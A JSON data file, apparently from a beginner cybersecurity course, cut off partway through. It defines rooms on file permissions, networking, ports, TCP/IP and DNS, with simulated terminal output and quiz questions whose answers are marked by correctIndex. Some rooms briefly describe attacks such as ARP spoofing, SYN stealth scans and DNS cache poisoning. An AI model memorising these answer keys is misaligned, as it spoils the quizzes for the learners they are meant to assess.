          "Tool: `chmod`",
          "Syntax: `chmod 600 confidential.txt`",
          "Explanation: Sets -rw------- permissions."
        ]
      }
    ],
    "explainResult": "The `chmod` command called the `chmod()` system call, modifying the file inode's permission bits in the ext4 filesystem metadata.",
    "securityConnection": "Improper permissions are a primary cause of security compromises. Writable configuration files allow attackers to inject malicious commands, while world-readable private keys let adversaries impersonate administrators.",
    "completion": {
      "learned": [
        "The UID/GID user identity model and root superuser (UID 0)",
        "Decoding Linux permission strings (User, Group, Others)",
        "Calculating octal values (r=4, w=2, x=1)",
        "Using chmod to protect sensitive files"
      ],
      "practiced": [
        "ls -l",
        "chmod 600",
        "Auditing file permissions"
      ]
    },
    "nextRoomId": "room-06"
  },
  {
    "id": "room-06",
    "stage": 2,
    "stageTitle": "Stage 2 — Networking Fundamentals",
    "title": "What Is a Network?",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "20 min",
    "prerequisites": "Stage 1 (Computer Fundamentals)",
    "whyAreYouHere": "A standalone computer cannot be hacked remotely; it is only vulnerable to physical tampering. Cybersecurity exists primarily because computers talk to each other across vast networks. In this room, you will learn how two devices connect, what routers and switches do, and how a local home network connects to the global Internet.",
    "objectives": [
      "Define what a computer network is and how devices communicate",
      "Understand the Client-Server relationship",
      "Differentiate between Local Area Networks (LAN) and Wide Area Networks (WAN)",
      "Learn the core hardware devices: Switches, Routers, and Access Points"
    ],
    "vocabulary": [
      {
        "term": "Network",
        "definition": "Two or more interconnected computing devices sharing data and resources over communication links."
      },
      {
        "term": "Client",
        "definition": "A device or software program (like your smartphone or browser) that initiates requests for data or services."
      },
      {
        "term": "Server",
        "definition": "A dedicated computer or process waiting to listen for incoming client requests and serve back responses."
      },
      {
        "term": "LAN (Local Area Network)",
        "definition": "A network contained within a small geographic area (like your home, office, or university lab)."
      },
      {
        "term": "WAN (Wide Area Network)",
        "definition": "A large network connecting multiple LANs across cities or continents — the Internet is the ultimate WAN."
      },
      {
        "term": "Router",
        "definition": "A network device that forwards data packets between different networks (e.g. between your LAN and the Internet)."
      },
      {
        "term": "Switch",
        "definition": "A hardware device operating inside a LAN that directs data directly between local devices using their MAC addresses."
      }
    ],
    "lessons": [
      {
        "title": "1. The Client-Server Architecture",
        "content": "Almost every interaction you perform online follows the **Client-Server model**:\n• You (the **Client**) open your browser and click a link to `endlessus.in`.\n• Your machine formulates a request asking for the web page.\n• The web host (the **Server**) receives the request, processes it, and transmits the HTML page back to you."
      },
      {
        "title": "2. How Data Travels: Switches vs Routers",
        "content": "• Inside your house, all your devices connect to a **Switch** (or Wi-Fi Access Point). If your laptop wants to print to your wireless printer, data stays purely inside your **LAN**.\n• When you want to visit a website across the world, your data must leave your LAN. It travels to your **Router**, which acts as the gateway to your ISP (Internet Service Provider) and the wider **WAN**."
      }
    ],
    "seeExamples": [
      {
        "title": "Home LAN to Internet Web Server Flow",
        "codeOrDiagram": "[ Phone / Laptop (Client) ]\n            ↓ Wi-Fi\n[ Access Point / Switch ]\n            ↓ Local LAN Traffic\n[ Default Gateway (Router) ]\n            ↓ Public WAN Link\n[ Internet Service Provider (ISP) ]\n            ↓ Global Fiber Backbones\n[ Web Server (endlessus.in) ]",
        "explanation": "Notice the boundary: inside your house is your private LAN. Once packets cross your router, they enter the public Internet WAN."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Test connectivity from your lab machine to our simulated gateway using the network utility `ping -c 3 192.168.1.1`:",
      "initialCommand": "",
      "expectedCommand": "ping -c 3 192.168.1.1",
      "simulatedOutput": "PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.412 ms\n64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.388 ms\n64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.401 ms\n--- 192.168.1.1 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2004ms\n[+] Success! Target gateway is alive with ~0.4ms round-trip latency.",
      "explanation": "`ping` sends ICMP Echo Request packets. When the remote device is online and reachable, it answers with ICMP Echo Replies."
    },
    "questions": [
      {
        "id": "r6-q1",
        "type": "multiple-choice",
        "question": "Which device is responsible for forwarding data packets between entirely different networks, such as routing your home traffic onto the Internet?",
        "options": [
          "Network Switch",
          "Router",
          "Ethernet Cable",
          "HDMI Splitter"
        ],
        "correctIndex": 1,
        "explanation": "A router operates at Layer 3 (Network Layer) and connects distinct networks together using IP routing tables."
      },
      {
        "id": "r6-q2",
        "type": "multiple-choice",
        "question": "In the Client-Server model, which entity initiates the connection request?",
        "options": [
          "The Server",
          "The Client",
          "The Router firewall",
          "The DNS Registrar"
        ],
        "correctIndex": 1,
        "explanation": "Clients initiate communication by sending requests; servers listen passively and respond."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Verify Gateway Reachability",
        "instruction": "Run `ping -c 3 192.168.1.1` to confirm your connection to the local gateway.",
        "hints": [
          "Concept: Send ICMP echo requests.",
          "Direction: Use the ping utility.",
          "Tool: `ping`",
          "Syntax: `ping -c 3 192.168.1.1` (`-c 3` stops after 3 packets).",
          "Explanation: 0% packet loss confirms the network path is operational."
        ]
      }
    ],
    "explainResult": "The `ping` command generated three ICMP (Internet Control Message Protocol) packets, transmitted them across the virtual network interface, and calculated the round-trip latency when replies arrived.",
    "securityConnection": "Network discovery and reconnaissance always begin with understanding network topology. Attackers perform 'ping sweeps' or ARP scans to discover active IP addresses on a target subnet.",
    "completion": {
      "learned": [
        "Network fundamentals and client-server communication",
        "LAN (Local Area Network) vs WAN (Wide Area Network)",
        "The roles of Switches (local switching) and Routers (inter-network routing)",
        "Using ICMP ping to test network reachability"
      ],
      "practiced": [
        "ping -c 3 192.168.1.1",
        "Interpreting round-trip latency and packet loss"
      ]
    },
    "nextRoomId": "room-07"
  },
  {
    "id": "room-07",
    "stage": 2,
    "stageTitle": "Stage 2 — Networking Fundamentals",
    "title": "IP Addresses & MAC Addresses",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "25 min",
    "prerequisites": "Room 06 (What Is a Network?)",
    "whyAreYouHere": "For two computers to exchange messages, each must know where to send the data. Just as sending postal mail requires both a street address and a recipient name, networks rely on two distinct addresses: physical MAC addresses for local hardware links, and logical IP addresses for internet routing. In this room, you will master IPv4, IPv6, private vs public addresses, and the ARP protocol.",
    "objectives": [
      "Understand IPv4 (32-bit dotted-decimal) and IPv6 (128-bit hexadecimal) addresses",
      "Differentiate between Public (globally routable) and Private (RFC 1918) IP addresses",
      "Understand Loopback / Localhost (`127.0.0.1`)",
      "Learn physical MAC addresses (Layer 2) and how ARP maps IP addresses to MACs",
      "Inspect your network interfaces using `ip addr`"
    ],
    "vocabulary": [
      {
        "term": "IPv4 Address",
        "definition": "A 32-bit numerical label written as four octets separated by dots (e.g., `192.168.1.10`), uniquely identifying a device on a network."
      },
      {
        "term": "IPv6 Address",
        "definition": "A 128-bit address written in hexadecimal (e.g., `2001:0db8::1`), created to replace IPv4 due to global address exhaustion."
      },
      {
        "term": "Private IP (RFC 1918)",
        "definition": "Non-routable IP ranges reserved for local internal networks: `10.0.0.0/8`, `172.16.0.0/12`, and `192.168.0.0/16`."
      },
      {
        "term": "Public IP",
        "definition": "A globally unique IP assigned to your router by your ISP that can be reached from anywhere on the public Internet."
      },
      {
        "term": "Localhost (`127.0.0.1`)",
        "definition": "The loopback address that refers back to the local machine you are currently operating on."
      },
      {
        "term": "MAC Address",
        "definition": "Media Access Control address: a permanent 48-bit hardware identifier burned into your network card (e.g. `00:1A:2B:3C:4D:5E`)."
      },
      {
        "term": "ARP (Address Resolution Protocol)",
        "definition": "The protocol used to discover the physical MAC address associated with a known IP address on a local network."
      }
    ],
    "lessons": [
      {
        "title": "1. The Postal Analogy: IP vs MAC",
        "content": "• **IP Address (Logical)**: Like your postal mailing address: *Building 4, Sector 7, New Delhi*. If you move your laptop to a coffee shop, your IP address changes because your network location changed.\n• **MAC Address (Physical)**: Like your fingerprint or national identity number. It is physically burned into your Network Interface Card (NIC) during manufacturing and never changes, regardless of where you plug in."
      },
      {
        "title": "2. The Private IP Ranges (RFC 1918)",
        "content": "Because IPv4 only has ~4.3 billion possible addresses, engineers reserved three blocks for internal use:\n1. `10.0.0.0` to `10.255.255.255` (Large corporate enterprise networks)\n2. `172.16.0.0` to `172.31.255.255` (Medium business networks)\n3. `192.168.0.0` to `192.168.255.255` (Home Wi-Fi routers and small labs)\nRouters on the public internet immediately drop any packets carrying a private RFC 1918 address!"
      }
    ],
    "seeExamples": [
      {
        "title": "Private LAN vs Public Internet Addressing",
        "codeOrDiagram": "[ Device: Laptop ]  Private IP: 192.168.1.15 | MAC: 00:1A:2B:3C:4D:5E\n         ↓ Local LAN\n[ Home Router ]     LAN IP: 192.168.1.1    | Public WAN IP: 203.0.113.45 (via NAT)\n         ↓ Public Internet\n[ Remote Server ]   Public IP: 104.21.55.2 | Web Server (endlessus.in)",
        "explanation": "Your home devices share one single public IP address through NAT (Network Address Translation). Remote websites only see the public IP of your router."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Inspect all network interfaces and IP addresses on this lab system using `ip addr`:",
      "initialCommand": "",
      "expectedCommand": "ip addr",
      "simulatedOutput": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    link/ether 02:42:0a:0a:0a:05 brd ff:ff:ff:ff:ff:ff\n    inet 10.10.10.5/24 brd 10.10.10.255 scope global eth0\n[+] Success! Interfaces identified: lo (127.0.0.1) and eth0 (10.10.10.5, MAC 02:42:0a:0a:0a:05).",
      "explanation": "Interface `lo` is loopback. Interface `eth0` is the virtual Ethernet card with IP `10.10.10.5` on subnet `/24`."
    },
    "questions": [
      {
        "id": "r7-q1",
        "type": "multiple-choice",
        "question": "Which of the following IP addresses is a private (RFC 1918) address used for internal local networks?",
        "options": [
          "8.8.8.8",
          "192.168.1.45",
          "142.250.190.46",
          "1.1.1.1"
        ],
        "correctIndex": 1,
        "explanation": "`192.168.1.45` falls squarely within the RFC 1918 Class C private range (`192.168.0.0/16`). The others are public IP addresses."
      },
      {
        "id": "r7-q2",
        "type": "multiple-choice",
        "question": "What protocol is used on a local network to discover the Layer 2 hardware MAC address that corresponds to an IP address?",
        "options": [
          "DNS (Domain Name System)",
          "DHCP (Dynamic Host Configuration Protocol)",
          "ARP (Address Resolution Protocol)",
          "BGP (Border Gateway Protocol)"
        ],
        "correctIndex": 2,
        "explanation": "ARP broadcasts a query asking 'Who has this IP? Tell your MAC address.' Devices cache these responses in their ARP table."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Inspect Lab Interface Addresses",
        "instruction": "Run `ip addr` in the terminal to view your configured network interfaces.",
        "hints": [
          "Concept: Linux modern network configuration command.",
          "Direction: Replaced the older `ifconfig` command.",
          "Tool: `ip` utility.",
          "Syntax: `ip addr` (or `ip a`).",
          "Explanation: Output reveals IP and MAC addresses."
        ]
      }
    ],
    "explainResult": "The `ip addr` utility made netlink calls to the Linux kernel to dump network device state and addresses registered to each interface.",
    "securityConnection": "Because ARP does not authenticate responses, local attackers can send fraudulent ARP packets claiming that the router's IP belongs to the attacker's MAC address. This is called 'ARP Poisoning' or 'ARP Spoofing', and allows a local adversary to perform Man-in-the-Middle (MitM) attacks.",
    "completion": {
      "learned": [
        "The difference between IPv4 and IPv6",
        "Private RFC 1918 address ranges vs globally routable Public IPs",
        "The role of the loopback interface (127.0.0.1)",
        "How ARP translates Layer 3 IP addresses into Layer 2 MAC addresses"
      ],
      "practiced": [
        "ip addr",
        "Differentiating IP and MAC addresses",
        "Identifying local subnet interfaces"
      ]
    },
    "nextRoomId": "room-08"
  },
  {
    "id": "room-08",
    "stage": 2,
    "stageTitle": "Stage 2 — Networking Fundamentals",
    "title": "Ports, Services & Protocols",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Room 07 (IP Addresses & MAC Addresses)",
    "whyAreYouHere": "An IP address tells you which computer to connect to, but a computer runs dozens of programs at once. How does incoming data know whether it belongs to a web server, a database, or an email service? The answer is **Ports**. Understanding standard ports and network services is one of the most critical foundational skills in cybersecurity.",
    "objectives": [
      "Understand what a network port is (range 0 to 65535)",
      "Learn the three port ranges: Well-Known (0-1023), Registered (1024-49151), and Ephemeral (49152-65535)",
      "Master the most common standard service ports (SSH, HTTP, HTTPS, DNS, SMB, MySQL, RDP)",
      "Understand the difference between open, closed, and filtered port states",
      "Inspect listening services on a system using `ss -tulpn`"
    ],
    "vocabulary": [
      {
        "term": "Port",
        "definition": "A 16-bit virtual endpoint (number 0 to 65535) that directs network traffic to a specific software service running on a machine."
      },
      {
        "term": "Network Service",
        "definition": "A daemon program (like Apache, OpenSSH, or MySQL) bound to a port, listening for incoming network connections."
      },
      {
        "term": "Well-Known Ports",
        "definition": "Ports 0 through 1023 reserved by IANA for standard core internet protocols and services."
      },
      {
        "term": "Ephemeral Ports",
        "definition": "Temporary, high-numbered ports (49152-65535) dynamically chosen by client operating systems to receive return traffic."
      },
      {
        "term": "Open Port",
        "definition": "A port where an active service is listening and willing to accept incoming network connections."
      }
    ],
    "lessons": [
      {
        "title": "1. The Apartment Analogy",
        "content": "Think of an IP address as the street address of an apartment building: *42 Cyber Street*.\nThe building has 65,536 individual apartments numbered **0 to 65535**.\n• Apartment **80** is the Web concierge (HTTP).\n• Apartment **443** is the Secure encrypted concierge (HTTPS).\n• Apartment **22** is the Building Administrator's private maintenance door (SSH).\n• Apartment **53** is the building directory phonebook (DNS).\nWhen you send a packet, you specify both the destination IP *and* the destination Port!"
      },
      {
        "title": "2. The Essential Security Reference Table",
        "content": "You do not need to memorize all 65,536 ports. You must know these fundamental ports by heart:\n• **21**: FTP (File Transfer Protocol — unencrypted)\n• **22**: SSH (Secure Shell — encrypted remote terminal)\n• **25**: SMTP (Simple Mail Transfer Protocol)\n• **53**: DNS (Domain Name System)\n• **80**: HTTP (Hypertext Transfer Protocol — unencrypted web)\n• **110**: POP3 (Post Office Protocol email retrieval)\n• **143**: IMAP (Internet Message Access Protocol)\n• **443**: HTTPS (HTTP over TLS/SSL — encrypted web)\n• **445**: SMB (Server Message Block — Windows file sharing)\n• **3306**: MySQL (Database engine)\n• **3389**: RDP (Remote Desktop Protocol — Windows graphical remote access)"
      }
    ],
    "seeExamples": [
      {
        "title": "Socket Combination: IP + Port",
        "codeOrDiagram": "Client (Your Laptop)                            Target Server\nIP: 192.168.1.15                                IP: 104.21.55.2\nEphemeral Port: 54321  =====================>   Destination Port: 443 (HTTPS)\n(Dynamic temporary port)                        (Well-known web service)\n\nReturn Traffic:\nServer (104.21.55.2:443) ===============>       Client (192.168.1.15:54321)",
        "explanation": "The combination of an IP address and a Port number is called a 'Socket' (e.g. `104.21.55.2:443`)."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Find all network services currently listening for incoming connections on this system using `ss -tulpn`:",
      "initialCommand": "",
      "expectedCommand": "ss -tulpn",
      "simulatedOutput": "Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process\ntcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:*      users:((\"sshd\",pid=842))\ntcp    LISTEN  0       511            0.0.0.0:80            0.0.0.0:*      users:((\"nginx\",pid=1104))\ntcp    LISTEN  0       128          127.0.0.1:3306          0.0.0.0:*      users:((\"mysqld\",pid=1250))\n[+] Success! Discovered listening services: SSH (port 22), Nginx Web (port 80), and MySQL (port 3306 on localhost).",
      "explanation": "`ss -tulpn` (Socket Statistics: TCP, UDP, Listening, Process Names, Numeric) is the standard modern utility for auditing active sockets."
    },
    "questions": [
      {
        "id": "r8-q1",
        "type": "matching",
        "question": "Match the standard default port number to its corresponding network service:",
        "options": [
          "Port 22 -> SSH, Port 80 -> HTTP, Port 443 -> HTTPS, Port 445 -> SMB",
          "Port 22 -> HTTP, Port 80 -> SSH, Port 443 -> DNS, Port 445 -> MySQL",
          "Port 22 -> FTP, Port 80 -> HTTPS, Port 443 -> HTTP, Port 445 -> RDP",
          "Port 22 -> SMB, Port 80 -> MySQL, Port 443 -> RDP, Port 445 -> SSH"
        ],
        "correctIndex": 0,
        "explanation": "Port 22 is SSH (Secure Shell), Port 80 is unencrypted HTTP, Port 443 is encrypted HTTPS, and Port 445 is Microsoft SMB file sharing."
      },
      {
        "id": "r8-q2",
        "type": "multiple-choice",
        "question": "Looking at the `ss -tulpn` output above, MySQL is listening on `127.0.0.1:3306`. Can a remote attacker on another network connect directly to this database port?",
        "options": [
          "Yes, because port 3306 is open to the entire internet",
          "No, because it is bound exclusively to loopback (127.0.0.1), so only local processes on the server can connect to it",
          "Yes, but only if they use an unencrypted FTP client",
          "No, because MySQL only runs on Windows operating systems"
        ],
        "correctIndex": 1,
        "explanation": "Binding to `127.0.0.1` is a security best-practice. It restricts socket access exclusively to programs running locally on the machine."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Audit Open Ports",
        "instruction": "Execute `ss -tulpn` in the terminal to inspect listening network services.",
        "hints": [
          "Concept: Socket statistics command.",
          "Direction: Use flags `-t` (TCP), `-u` (UDP), `-l` (listening), `-p` (processes), `-n` (numeric).",
          "Tool: `ss`",
          "Syntax: `ss -tulpn`",
          "Explanation: Lists all listening sockets."
        ]
      }
    ],
    "explainResult": "The `ss` command queried the Linux kernel socket diagnostic API (`sock_diag`) to retrieve all TCP and UDP transmission control blocks currently in the `LISTEN` state.",
    "securityConnection": "Every open port on a server represents attack surface! If a server exposes port 21 (FTP), attackers will test for anonymous logins. If it exposes port 3389 (RDP), they will test for brute-force passwords or BlueKeep vulnerabilities. Hardening a server begins with shutting down every port that is not strictly necessary.",
    "completion": {
      "learned": [
        "What network ports are and why they exist (0-65535)",
        "The standard common service ports (21, 22, 53, 80, 443, 445, 3306, 3389)",
        "How sockets combine an IP address with a port number",
        "The security implication of binding to 127.0.0.1 vs 0.0.0.0"
      ],
      "practiced": [
        "ss -tulpn",
        "Auditing listening sockets",
        "Matching ports to service daemons"
      ]
    },
    "nextRoomId": "room-09"
  },
  {
    "id": "room-09",
    "stage": 2,
    "stageTitle": "Stage 2 — Networking Fundamentals",
    "title": "TCP/IP & Packet Encapsulation",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Room 08 (Ports, Services & Protocols)",
    "whyAreYouHere": "When you download a file or stream a video, the file is not transmitted as one giant continuous block of data. Instead, it is chopped up into thousands of tiny envelopes called **Packets**. In this room, you will learn how data is encapsulated as it moves down the network stack, how the famous TCP 3-Way Handshake establishes reliable connections, and when UDP is chosen instead of TCP.",
    "objectives": [
      "Understand Packet Encapsulation and the 4-layer TCP/IP Model",
      "Understand the difference between Frames (Layer 2), Packets (Layer 3), and Segments (Layer 4)",
      "Master the TCP 3-Way Handshake: SYN -> SYN-ACK -> ACK",
      "Compare connection-oriented TCP (reliable) with connectionless UDP (fast, streaming)",
      "Follow an interactive packet visualization"
    ],
    "vocabulary": [
      {
        "term": "Packet",
        "definition": "A formatted unit of data carried across a packet-switched network, containing control headers and user payload."
      },
      {
        "term": "Encapsulation",
        "definition": "The process where each network layer wraps the data from the layer above it with its own header."
      },
      {
        "term": "TCP (Transmission Control Protocol)",
        "definition": "A reliable, connection-oriented transport protocol that guarantees ordered, error-checked packet delivery."
      },
      {
        "term": "UDP (User Datagram Protocol)",
        "definition": "A lightweight, connectionless transport protocol that sends datagrams without handshakes or delivery guarantees."
      },
      {
        "term": "TCP 3-Way Handshake",
        "definition": "The three-message exchange (SYN, SYN-ACK, ACK) required to establish a TCP session before data can flow."
      },
      {
        "term": "SYN (Synchronize)",
        "definition": "The first TCP packet sent by a client to request a connection and negotiate initial sequence numbers."
      },
      {
        "term": "ACK (Acknowledge)",
        "definition": "A TCP flag acknowledging receipt of previous packets."
      }
    ],
    "lessons": [
      {
        "title": "1. The Russian Nesting Dolls: Encapsulation",
        "content": "When your browser sends an HTTP request:\n1. **Application Layer**: Contains raw HTTP text: `GET / HTTP/1.1`.\n2. **Transport Layer (TCP)**: Wraps it in a **TCP Segment** adding Source Port and Destination Port.\n3. **Network Layer (IP)**: Wraps that in an **IP Packet** adding Source IP and Destination IP.\n4. **Data Link Layer (Ethernet)**: Wraps that in an **Ethernet Frame** adding Source MAC and Destination MAC.\nEach layer only cares about its own header!"
      },
      {
        "title": "2. The TCP 3-Way Handshake",
        "content": "Before a single byte of web data can transfer over TCP, client and server must agree to communicate:\n1. **SYN**: Client sends: *\"Hello! I want to connect. My sequence number is 1000.\"*\n2. **SYN-ACK**: Server replies: *\"I hear you! I agree to connect. I received 1000, and my sequence number is 5000.\"*\n3. **ACK**: Client confirms: *\"Understood! Connection established.\"*\nNow data begins flowing. If a packet gets dropped along the way, TCP automatically detects the missing sequence number and re-transmits it!"
      },
      {
        "title": "3. TCP vs UDP: Which to Use?",
        "content": "• **Use TCP** when **accuracy is essential**: Websites (HTTP/HTTPS), file downloads, SSH, and databases. If a byte is missing in a bank transfer, it corrupts the file.\n• **Use UDP** when **speed is essential**: Voice/video calls (VoIP, Zoom), multiplayer online games, and DNS queries. If one audio frame drops in a voice call, nobody wants the call to pause for re-transmission!"
      }
    ],
    "seeExamples": [
      {
        "title": "The TCP 3-Way Handshake Sequence",
        "codeOrDiagram": "Client                                 Server\n  |                                      |\n  | ------------ [ SYN ] --------------> | (Step 1: Request connection)\n  |                                      |\n  | <--------- [ SYN-ACK ] ------------- | (Step 2: Acknowledge & offer sync)\n  |                                      |\n  | ------------ [ ACK ] --------------> | (Step 3: Acknowledge & ready)\n  |                                      |\n  | ======== [ DATA STREAM ] ==========> | (Step 4: HTTP Request / Payload)",
        "explanation": "Every single web request, SSH login, and database query begins with these exact three packets."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate a TCP handshake to a remote web server using `curl -I https://endlessus.in`:",
      "initialCommand": "",
      "expectedCommand": "curl -I https://endlessus.in",
      "simulatedOutput": "HTTP/2 200 \nserver: GitHub.com\ncontent-type: text/html; charset=utf-8\nstrict-transport-security: max-age=31536000\n[+] Success! Full TCP handshake + TLS negotiation + HTTP/2 HEAD request completed in 42ms.",
      "explanation": "`curl -I` performs the TCP handshake, negotiates TLS encryption, sends an HTTP HEAD request, and prints only the response headers."
    },
    "questions": [
      {
        "id": "r9-q1",
        "type": "multiple-choice",
        "question": "What are the three steps of the TCP connection establishment handshake in correct chronological order?",
        "options": [
          "SYN -> ACK -> FIN",
          "SYN -> SYN-ACK -> ACK",
          "PING -> PONG -> OK",
          "HELLO -> READY -> GO"
        ],
        "correctIndex": 1,
        "explanation": "The client sends a SYN, the server responds with SYN-ACK, and the client finishes with ACK."
      },
      {
        "id": "r9-q2",
        "type": "multiple-choice",
        "question": "Why does live online multiplayer gaming or VoIP voice chat typically rely on UDP rather than TCP?",
        "options": [
          "UDP automatically encrypts all passwords with AES-256",
          "UDP prioritizes real-time low latency over re-transmitting lost packets",
          "UDP requires physical fiber-optic cables to function",
          "UDP is only supported on Windows operating systems"
        ],
        "correctIndex": 1,
        "explanation": "UDP does not retransmit dropped packets, avoiding stutter and delay during real-time streaming."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Execute TCP Connection Probe",
        "instruction": "Run `curl -I https://endlessus.in` to complete a handshake and retrieve server headers.",
        "hints": [
          "Concept: Perform an HTTP HEAD request via TCP/TLS.",
          "Direction: Use the client URL utility.",
          "Tool: `curl`",
          "Syntax: `curl -I https://endlessus.in`",
          "Explanation: Performs handshake and prints response headers."
        ]
      }
    ],
    "explainResult": "The `curl` command initiated a TCP socket, triggered the SYN/SYN-ACK/ACK sequence, negotiated cryptographic ciphers over TLS, and retrieved HTTP status `200 OK`.",
    "securityConnection": "Understanding the TCP handshake is the secret behind network scanning! In Stage 5, you will learn about the **SYN Stealth Scan** (`nmap -sS`), where an attacker sends a SYN packet to test if a port is open, but intentionally sends a RST (Reset) before completing the final ACK. This detects open ports without establishing full connections in server application logs!",
    "completion": {
      "learned": [
        "The 4-layer TCP/IP encapsulation process",
        "Frames (L2), Packets (L3), Segments (L4), and Application Payloads",
        "The mechanics of the TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK)",
        "When to use reliable TCP vs low-latency UDP"
      ],
      "practiced": [
        "curl -I",
        "Tracing TCP connection stages",
        "Analyzing header responses"
      ]
    },
    "nextRoomId": "room-10"
  },
  {
    "id": "room-10",
    "stage": 2,
    "stageTitle": "Stage 2 — Networking Fundamentals",
    "title": "DNS & DHCP Fundamentals",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "25 min",
    "prerequisites": "Room 09 (TCP/IP & Packets)",
    "whyAreYouHere": "Humans remember names like `endlessus.in` or `google.com`, but routers and switches only understand numerical IP addresses like `104.21.55.2`. How does your computer bridge that gap in a fraction of a millisecond? That is the job of **DNS**, the phonebook of the Internet. In this room, you will learn how DNS resolution works and how **DHCP** automatically configures your device the instant you join a network.",
    "objectives": [
      "Understand what the Domain Name System (DNS) does and how it resolves names to IPs",
      "Learn the core DNS record types: A (IPv4), AAAA (IPv6), CNAME (Alias), MX (Mail), and TXT (Verification)",
      "Understand Recursive Resolvers, Root Nameservers, and Authoritative Nameservers",
      "Understand the DHCP 4-step DORA process (Discover, Offer, Request, Acknowledge)",
      "Query DNS records in the terminal using `dig`"
    ],
    "vocabulary": [
      {
        "term": "DNS (Domain Name System)",
        "definition": "The distributed hierarchical database system that translates human-readable domain names into numerical IP addresses."
      },
      {
        "term": "A Record",
        "definition": "A DNS record that maps a domain name directly to an IPv4 address (e.g. `endlessus.in` -> `185.199.108.153`)."
      },
      {
        "term": "AAAA Record",
        "definition": "A DNS record that maps a domain name to an IPv6 address."
      },
      {
        "term": "CNAME Record",
        "definition": "Canonical Name record: an alias that points one domain name to another domain name."
      },
      {
        "term": "MX Record",
        "definition": "Mail Exchange record: specifies the mail servers responsible for accepting email on behalf of a domain."
      },
      {
        "term": "DHCP (Dynamic Host Configuration Protocol)",
        "definition": "A network protocol that automatically assigns IP addresses, subnet masks, and default gateways to joining devices."
      }
    ],
    "lessons": [
      {
        "title": "1. The 4-Step DNS Hierarchy",
        "content": "When you type a domain into your browser:\n1. **Local / Recursive Resolver** (e.g., your ISP or Cloudflare `1.1.1.1`): Checks if the answer is in cache.\n2. **Root Nameservers (`.`)**: Directs the query to the Top-Level Domain (TLD) servers.\n3. **TLD Nameservers (`.in` or `.com`)**: Directs the query to the domain's Authoritative Nameserver.\n4. **Authoritative Nameserver**: Holds the true, official DNS records and returns the final IP address."
      },
      {
        "title": "2. DHCP: The DORA Process",
        "content": "When your phone joins a Wi-Fi network, how does it get an IP address without manual configuration?\n• **Discover**: Phone broadcasts: *\"Is there a DHCP server here? I need an address!\"*\n• **Offer**: Router replies: *\"I have 192.168.1.105 available for you.\"*\n• **Request**: Phone answers: *\"Great, I would like to lease 192.168.1.105.\"*\n• **Acknowledge**: Router confirms: *\"Lease granted! Your gateway is 192.168.1.1 and DNS is 1.1.1.1.\"*"
      }
    ],
    "seeExamples": [
      {
        "title": "Querying DNS Records with dig",
        "codeOrDiagram": "cadet@endlessus:~$ dig endlessus.in +short\n185.199.108.153\n185.199.109.153\n185.199.110.153\n185.199.111.153\n\ncadet@endlessus:~$ dig endlessus.in MX +short\n10 mail.endlessus.in.",
        "explanation": "`dig` (Domain Information Groper) is the ultimate tool for security analysts to query DNS infrastructure."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Query the official IPv4 address of `endlessus.in` using `dig endlessus.in +short`:",
      "initialCommand": "",
      "expectedCommand": "dig endlessus.in +short",
      "simulatedOutput": "185.199.108.153\n185.199.109.153\n185.199.110.153\n185.199.111.153\n[+] Success! Resolved 4 GitHub Pages Anycast IPv4 A-records.",
      "explanation": "The query returned the four global Anycast IP addresses serving the static website."
    },
    "questions": [
      {
        "id": "r10-q1",
        "type": "multiple-choice",
        "question": "Which DNS record type is responsible for mapping a domain name to a standard 32-bit IPv4 address?",
        "options": [
          "MX Record",
          "CNAME Record",
          "A Record",
          "TXT Record"
        ],
        "correctIndex": 2,
        "explanation": "The 'A' record (Address record) maps hostnames to IPv4 addresses. The 'AAAA' record maps to IPv6."
      },
      {
        "id": "r10-q2",
        "type": "multiple-choice",
        "question": "What is the acronym for the 4-step sequence a device executes with a DHCP server to receive an automatic IP address?",
        "options": [
          "DORA (Discover, Offer, Request, Acknowledge)",
          "SYN, ACK, FIN, RST",
          "GET, POST, PUT, DELETE",
          "SCAN, PROBE, IDENTIFY, MAP"
        ],
        "correctIndex": 0,
        "explanation": "DORA: Discover -> Offer -> Request -> Acknowledge."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Query Domain A-Records",
        "instruction": "Use `dig endlessus.in +short` to resolve the platform's public IP addresses.",
        "hints": [
          "Concept: Query DNS servers for A records.",
          "Direction: Use the standard dig tool with the short flag.",
          "Tool: `dig`",
          "Syntax: `dig endlessus.in +short`",
          "Explanation: Returns IP addresses."
        ]
      }
    ],
    "explainResult": "The `dig` utility constructed a UDP datagram on port 53 containing an RFC 1035 DNS Question section for `endlessus.in IN A`, transmitted it to the system resolver, and unpacked the Answer section.",
    "securityConnection": "DNS is a prime target for reconnaissance and exploitation. Attackers use 'Subdomain Enumeration' to discover hidden development servers (`dev.company.com`, `admin-portal.company.com`). Additionally, attackers execute 'DNS Spoofing / Cache Poisoning' to redirect banking users to fake phishing websites.",
    "completion": {
